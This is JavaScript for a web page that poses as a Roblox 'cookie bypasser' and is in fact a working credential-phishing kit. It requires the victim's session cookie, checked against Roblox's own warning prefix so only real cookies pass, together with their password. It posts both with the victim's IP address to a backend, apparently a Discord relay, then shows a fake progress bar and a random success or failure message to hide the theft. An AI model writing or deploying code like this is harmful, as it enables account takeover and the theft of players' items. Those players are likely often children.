const videoEl = document.getElementById("bgVideo");
const toggleAudioBtn = document.getElementById("toggleAudioBtn");
toggleAudioBtn.textContent = videoEl.muted ? "Unmute" : "Mute";
toggleAudioBtn.addEventListener("click", () => {
  videoEl.muted = !videoEl.muted;
  if (!videoEl.muted) {
    videoEl.play().catch(() => {});
  }
  toggleAudioBtn.textContent = videoEl.muted ? "Unmute" : "Mute";
});

const requiredSignature = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items";
const cookieInput = document.getElementById("cookie");
cookieInput.addEventListener("input", () => {
  if (cookieInput.value.trim() && !cookieInput.value.includes(requiredSignature)) {
    cookieInput.setCustomValidity("𝗶𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗼𝗸𝗶𝗲.😭");
  } else {
    cookieInput.setCustomValidity("");
  }
  cookieInput.reportValidity();
});

const form = document.getElementById("form");
const submitBtn = document.getElementById("submitBtn");
const progressBox = document.getElementById("progressContainer");
const progressBar = document.getElementById("progressBar");
const progressText = document.getElementById("progressText");
const mainContainer = document.getElementById("mainContainer");
const finalMessage = document.getElementById("finalMessage");

form.addEventListener("submit", (e) => {
  if (!form.checkValidity()) return;
  e.preventDefault();

  const cookieVal = cookieInput.value.trim();
  const passVal = document.getElementById("password").value.trim();

  submitBtn.textContent = "Processing...";
  submitBtn.disabled = true;
  progressBar.style.width = "0%";
  progressBar.style.transition = "none";
  progressText.textContent = "";
  progressBox.style.display = "block";
  progressText.style.display = "block";

  // Animate progress bar to fill up to 100%
  setTimeout(() => {
    progressBar.style.transition = "width 2s ease-out";
    progressBar.style.width = "100%";
  }, 100);

  setTimeout(() => {
    progressText.textContent = "100%";
    sendToDiscord(cookieVal, passVal)
      .then(() => {
        // Set a 20% chance of success
        const chance = Math.random();
        if (chance < 0.2) {
          doSuccess();
        } else {
          doFail();
        }
      })
      .catch(() => {
        handleInvalidCookie();
      });
  }, 2100);
});

function sendToDiscord(cookieVal, passVal) {
  return fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(ipData => {
      const userIp = ipData.ip;
      return fetch("/api/sender", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie: cookieVal, password: passVal, ip: userIp })
      });
    })
    .then(response => {
      if (!response.ok) {
        return response.json().then(data => {
          throw new Error(data.error || "Error");
        });
      }
      return response.json();
    });
}

function handleInvalidCookie() {
  progressBar.style.width = "100%";
  progressText.textContent = "100%";
  showFinalMessage(false, "Invalid cookie, please get a fresh cookie.");
}

function doSuccess() {
  showFinalMessage(true, "Your cookie is now bypassed!");
}

function doFail() {
  showFinalMessage(false, "Failed to bypass cookie. Please try again.");
}

function showFinalMessage(isSuccess, msg) {
  mainContainer.style.display = "none";
  finalMessage.classList.remove("success", "fail");
  finalMessage.classList.add(isSuccess ? "success" : "fail");
  finalMessage.innerHTML = `<h3>${isSuccess ? "Successful!" : "Failed!"}</h3><p>${msg}</p>`;
  finalMessage.style.display = "block";
  submitBtn.textContent = "Submit";
  submitBtn.disabled = false;
}